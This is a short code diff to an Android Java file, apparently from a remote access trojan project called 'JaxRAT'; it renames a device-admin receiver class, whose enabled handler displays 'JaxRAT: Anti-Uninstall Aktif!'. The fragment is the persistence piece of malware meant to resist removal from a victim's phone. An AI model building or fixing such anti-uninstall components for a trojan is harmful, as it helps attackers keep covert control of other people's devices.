@@ -5,7 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.widget.Toast;
 
-public class DeviceAdminReceiver extends DeviceAdminReceiver {
+public class JaxAdminReceiver extends DeviceAdminReceiver {
     @Override
     public void onEnabled(Context context, Intent intent) {
         Toast.makeText(context, "JaxRAT: Anti-Uninstall Aktif!", Toast.LENGTH_SHORT).show();
